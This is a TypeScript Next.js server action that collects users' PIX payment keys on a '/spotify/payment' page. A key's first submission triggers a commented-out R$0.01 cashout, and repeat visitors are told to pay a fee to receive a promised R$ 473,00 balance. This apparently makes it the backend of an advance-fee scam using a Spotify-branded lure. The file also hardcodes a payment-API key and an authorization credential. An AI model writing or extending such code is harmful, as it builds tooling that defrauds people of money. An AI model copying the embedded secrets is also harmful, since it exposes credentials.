'use server'

import { actionClient } from "@/lib/safe-action"
import { PaymentSchema } from "./types"
import { cookies } from "next/headers"
import { db } from "@/lib/prisma"
import axios from 'axios'


interface AxiosCustomError extends Error {
  config?: {
    url?: string;
    method?: string;
    headers?: Record<string, string>;
    data?: any;
  };
  code?: string;
  response?: {
    data?: any;
    status?: number;
    headers?: Record<string, string>;
  };
  request?: any;
  syscall?: string;
  hostname?: string;
  errno?: number;
}


export const createPayment = actionClient
  .schema(PaymentSchema)
  .action(
    async ({
      parsedInput: {
        document,
        pixType,
        pixKey,
        name
      },
    }) => {

      if (!pixKey) {
        return {
          success: false,
          message: 'Chave PIX não informada.',
          errors: null
        }
      }

      try {

        let keyPix
        if (pixType === 'CPF') {
          keyPix = pixKey.replace(/[.\-]/g, '')
        } else if (pixType === 'PHONE') {
          keyPix = pixKey.replace(/[().\-\s]/g, '');
        } else {
          keyPix = pixKey
        }

        const userId = cookies().get('token')?.value!


        cookies().set('user_pix_key', pixKey, {
          path: '/',
          maxAge: 7 * 24 * 60 * 60
        })


        const pix = await db.blackList.findUnique({
          where: {
            pixKey
          }
        })

        if (pix) {


          await db.tracking.create({
            data: {
              pageName: 'Pagina chave PIX',
              pageUrl: '/spotify/payment',
              userId
            }
          })


          return {
            success: true,
            message: 'Chave PIX validada, pague a taxa e receba o saldo restante de R$ 473,00.',
            errors: null,
          }
        }

        await db.blackList.create({
          data: {
            pixKey,
            plataform: 'A'
          }
        })



        // const response = await axios({
        //   method: 'POST',
        //   url: 'https://api.syncpay.pro/c1/cashout/api/',
        //   headers: {
        //     'Content-Type': 'application/json',
        //     'Authorization': 'Basic ODM5YzE0YWI1ZTE2NzhmYjAxODFlZjVl'
        //   },
        //   data: {
        //     "api_key": "839c14ab5e1678fb0181ef5e",
        //     "amount": 0.01,
        //     "pixKey": keyPix,
        //     "pixType": pixType,
        //     "beneficiaryName": name,
        //     "beneficiaryDocument": document.replace(/[.\-]/g, ''),
        //     "description": "Pagamento generico",
        //     "postbackUrl": "https://happy-iron-45.webhook.cool/"
        //   }
        // });




        //console.log(response.data)


        await db.tracking.create({
          data: {
            pageName: 'Pagina chave PIX',
            pageUrl: '/spotify/payment',
            userId
          }
        })

        return {
          success: true,
          message: null,
          errors: null,
        }

      } catch (error: unknown) {

        const axiosError = error as AxiosCustomError;

        console.error('Detalhes do erro:', {
          message: axiosError.message,
          code: axiosError.code,
          syscall: axiosError.syscall,
          hostname: axiosError.hostname,
          url: axiosError.config?.url,
          method: axiosError.config?.method,
          requestData: axiosError.config?.data,
          responseStatus: axiosError.response?.status,
          responseData: axiosError.response?.data,
          stack: axiosError.stack
        });

        return {
          success: false,
          message: 'An unexpected error occurred',
          errors: error instanceof Error ? error.message : null,
        }
      }
    }
  )